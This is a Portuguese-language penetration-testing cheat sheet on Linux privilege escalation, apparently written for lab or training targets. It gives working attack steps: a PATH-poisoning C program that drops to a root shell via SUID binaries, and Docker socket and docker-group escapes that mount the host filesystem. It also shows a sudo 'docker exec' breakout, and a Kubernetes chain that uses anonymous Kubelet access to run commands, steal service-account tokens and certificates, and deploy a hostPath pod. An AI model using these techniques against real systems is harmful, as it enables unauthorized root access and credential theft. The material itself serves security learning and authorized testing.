
## Envenenamento de PATH e SUID/SGID

Usando envenenamento de path para enganar algum executável que tem suid ou sgid e chama outros executáveis:

1 - Envenenar o path para uma pasta que tenho permissões:
```bash
export PATH="/tmp:$PATH"
```

2 - Compilar um executável para passar os privilégios para o bash (não funciona com shell scripts)
```bash
cat > /tmp/executavel.c << EOF
#include <unistd.h>
#include <stdlib.h>
int main() {
	setuid(0);
	setgid(0);
	execl("/bin/bash","bash","-i", NULL);
	return 0;
}
EOF

# o nome do executavel deve ser o mesmo nome que seu alvo vai chamar, usar o strings para encontrar quais executaveis ele chama, ou a documentação
gcc executavel.c -o executavel

# para executar
/path/executavel/com/suid

```

## Escalação de Privilégio com Containers

### Docker

#### Arquitetura do Docker

https://intrusionz3r0.gitbook.io/intrusionz3r0/containers-pentesting

**Docker Daemon**

O `Docker Daemon`, também conhecido como servidor Docker, é uma parte crítica da plataforma Docker que desempenha um papel fundamental no gerenciamento e orquestração de containers.

Ele tem várias responsabilidades essenciais como:

* executar containers Docker
* interagir com containers Docker
* gerenciar containers Docker no sistema host

**Docker Clients**

Quando interagimos com o Docker, emitimos comandos através do `Docker Client`, que se comunica com o Docker Daemon (através de uma `API RESTful` ou um `Unix socket`) e serve como nosso meio principal de interagir com o Docker.

**Docker Compose**

É uma ferramenta que simplifica a orquestração de múltiplos containers Docker como uma única aplicação. Permite-nos definir a arquitetura multi-container da nossa aplicação usando um arquivo `YAML` (`.yaml`/`.yml`). Com ele, podemos especificar os serviços que compõem nossa aplicação, suas dependências e suas configurações. Definimos imagens de containers, variáveis de ambiente, rede, bindings de volumes e outras configurações.

**Docker Sockets**

Um Docker socket ou socket do Docker daemon é um arquivo especial que nos permite e aos processos se comunicarem com o Docker daemon. Esta comunicação ocorre através de um Unix socket ou um socket de rede. Ao expor o Docker socket sobre uma interface de rede, podemos gerenciar remotamente hosts Docker, emitir comandos e controlar containers e outros recursos.

Quando emitimos um comando através do Docker CLI, o Docker client envia o comando para o Docker socket, e o Docker daemon, por sua vez, processa o comando e executa as ações solicitadas.

Você pode `export DOCKER_HOST="tcp://localhost:2375"` e **evitar** usar o parâmetro `-H` com o comando docker

#### Comandos básicos:

```bash
docker version # Obter versão do docker client, API, engine, containerd, runc, docker-init
docker info # Obter mais informações sobre configurações do docker
docker pull registry:5000/alpine # Baixar a imagem
docker inspect <containerid> # Obter informações do container
docker network ls # Listar informações de rede
docker exec -it <containerid> /bin/sh # Obter shell dentro de um container
docker commit <cotainerid> registry:5000/name-container # Atualizar container
docker export -o alpine.tar <containerid> # Exportar container como arquivo tar
docker save -o ubuntu.tar <image> # Exportar uma imagem
docker ps -a # Listar containers em execução e parados
docker stop <containedID> # Parar container em execução
docker rm <containerID> # Remover container ID
docker image ls # Listar imagens
docker rmi <imgeID> # Remover imagem
docker system prune -a
# Isso irá remover:
#  - todos os containers parados
#  - todas as redes não usadas por pelo menos um container
#  - todas as imagens sem pelo menos um container associado a elas
#  - todo o cache de build
```

### Técnicas de Escalação de Privilégio

#### Docker socket está exposto

Por padrão, é gravável pelo usuário `root` e membros do grupo `docker`. Possuir acesso de escrita a este socket pode levar à escalação de privilégio. Aqui está um resumo de como isso pode ser feito e métodos alternativos se o Docker CLI não estiver disponível.

Download: <https://master.dockerproject.org/linux/x86%5F64/docker>

```bash
# Baixar binário docker para dentro do container
wget https://<parrot-os>:443/docker -O docker
chmod +x docker

# Localizar o docker.sock
find / -name "docker.sock" 2>/dev/null
/run/docker.sock

# Listar imagens disponíveis
/path/docker -H unix:///run/docker.sock images

# Criar nosso próprio container Docker que mapeia o diretório raiz do host (/) para o diretório /hostsystem no container.
/path/docker -H unix:///run/docker.sock run --rm -d --privileged -v /:/hostsystem <image> tail -f /dev/null

# Spawn shell
/path/docker -H unix:///run/docker.sock exec -it 7ae3bcc818af /bin/bash
```

Você pode `export DOCKER_HOST="tcp://localhost:2375"` e **evitar** usar o parâmetro `-H` com o comando docker

#### Escalação de privilégio do grupo Docker

Para obter privilégios root através do Docker, o usuário com o qual estamos logados deve estar no grupo `docker`. Isso permite que ele use e controle o Docker daemon. Geralmente, este socket está localizado em `/var/run/docker.sock`.

```bash
# Listar imagens existentes
docker image ls
# criar um container com acesso direto e privilegiado ao sistema de arquivos do host, permitindo que você execute comandos como se estivesse no próprio host.
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

### Docker Breakout

#### docker exec escalação de privilégio

Se um usuário possui a permissão para executar `docker exec *` como root (sem senha), você pode aproveitá-lo para **escalar privilégios e obter controle total sobre o sistema host**.

```bash
boris@ip-10-10-10-11:~$ sudo -l
Matching Defaults entries for boris on ip-10-10-10-11:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User boris may run the following commands on ip-10-10-10-11:
    (root) NOPASSWD: /snap/bin/docker exec *

boris@ip-10-10-10-11:~$ ps -auxww | grep namespace
#root      1598  0.0  0.7 711452  7956 ?        Sl   03:35   0:00 /snap/docker/1125/bin/containerd-shim-runc-v2 -namespace moby -id e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 -address /run/snap.docker/containerd/containerd.sock
<snif>

boris@ip-10-10-10-11:~$ echo e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 | head -c 12 | xargs
e6ff5b1cbc85

boris@ip-10-10-10-11:~$ sudo /snap/bin/docker exec -it --user root --privileged e6ff5b1cbc85 /bin/bash
bash-5.1# fdisk -l
Disk /dev/xvda: 8192 MB, 8589934592 bytes, 16777216 sectors
6367 cylin...(2100 chars omitted)...
```

#### Docker breakout automatic tool

### LXD/LXC

### Kubernetes

#### Escalação de Privilégio

A arquitetura do Kubernetes é dividida principalmente em dois tipos de componentes:

* `O Control Plane` (nó master), que é responsável por controlar o cluster Kubernetes
* `Os Worker Nodes` (minions), onde as aplicações containerizadas são executadas
* **Nó master:** O nó master hospeda o `Control Plane` do Kubernetes, que gerencia e coordena todas as atividades dentro do cluster e também garante que o estado desejado do cluster seja mantido.
* **Minions:** executam as aplicações reais e recebem instruções do Control Plane e garantem que o estado desejado seja alcançado.
* O `Scheduler`, baseado no `API server`, entende o estado do cluster e agenda novos pods nos nós adequadamente. Depois de decidir em qual nó um pod deve ser executado, o API server atualiza o `etcd`.

**Control Plane**

O Control Plane serve como a camada de gerenciamento. Ele consiste em vários componentes cruciais, incluindo:

**Serviço**

**Portas TCP**

| Serviço | Portas TCP |
|---------|------------|
| `etcd` | `2379`, `2380` |
| `API server` | `6443` |
| `Scheduler` | `10251` |
| `Controller Manager` | `10252` |
| `Kubelet API` | `10250` |
| `Read-Only Kubelet API` | `10255` |

**API do Kubernetes**

| Requisição | Descrição |
|------------|-----------|
| `GET` | Recupera informações sobre um recurso ou uma lista de recursos. |
| `POST` | Cria um novo recurso. |
| `PUT` | Atualiza um recurso existente. |
| `PATCH` | Aplica atualizações parciais a um recurso. |
| `DELETE` | Remove um recurso. |

**Autenticação**

O Kubernetes suporta vários métodos como:

* certificados de cliente,
* bearer tokens
* proxy de autenticação
* HTTP basic auth

Uma vez que o usuário foi autenticado, o Kubernetes aplica decisões de autorização usando Role-Based Access Control (`RBAC`).

O `Kubelet` pode ser configurado para permitir `acesso anônimo`. Por padrão, o Kubelet permite acesso anônimo. Requisições anônimas são consideradas não autenticadas, o que implica que qualquer requisição feita ao Kubelet sem um certificado de cliente válido será tratada como anônima.

```bash
# Kubelet API - Extraindo Pods
curl https://10.129.10.11:10250/pods -k | jq .
```

Entender as imagens de containers e suas versões usadas no cluster pode nos permitir identificar vulnerabilidades conhecidas e explorá-las para obter acesso não autorizado ao sistema.

* Informações de namespace podem fornecer insights sobre como os pods e recursos estão organizados dentro do cluster, que podemos usar para direcionar namespaces específicos com vulnerabilidades conhecidas.
* Metadados como `uid` e `resourceVersion` para realizar reconhecimento e reconhecer alvos potenciais para ataques posteriores.

Divulgar a configuração aplicada pela última vez pode potencialmente expor informações sensíveis, como senhas, segredos ou tokens de API, usados durante a implantação dos pods.

```bash
# Kubelet API - Extraindo Pods
kubeletctl -i --server 10.129.10.11 pods

# Kubelet API - enumerar Pods vulneráveis a RCE
kubeletctl -i --server 10.129.10.11 scan rce
┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                  │
├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │              │                                    │             │                         │ RUN │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.129.10.11 │ nginx                              │ default     │ nginx                   │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 2 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤

# Kubelet API - Executando Comandos
kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx

kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
```

Para obter privilégios mais altos e acessar o sistema host, temos que obter o `token` da conta de serviço do Kubernetes e o `certificado` (`ca.crt`) do servidor.

```bash
# Extrair tokens
kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
# Extrair certificados
kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```

Podemos verificar os direitos de acesso no cluster Kubernetes.

```bash
export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
Resources										Non-Resource URLs	Resource Names	Verbs 
selfsubjectaccessreviews.authorization.k8s.io		[]					[]				[create]
selfsubjectrulesreviews.authorization.k8s.io		[]					[]				[create]
pods                      											[]					[]				[get create list]
...SNIP...
```

Podemos `get`, `create` e `list` pods e a partir daqui, podemos criar um arquivo `YAML` que podemos usar para criar um novo container e montar todo o sistema de arquivos raiz do sistema host no diretório `/root` deste container. A partir daí, poderíamos acessar os arquivos e diretórios do sistema host.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

```bash
# Criar Pod utilizando o YAML
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
# Listar os pods existentes
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
# Executar comandos
kubeletctl --server 10.129.10.11 exec "<command>" -p privesc -c privesc
```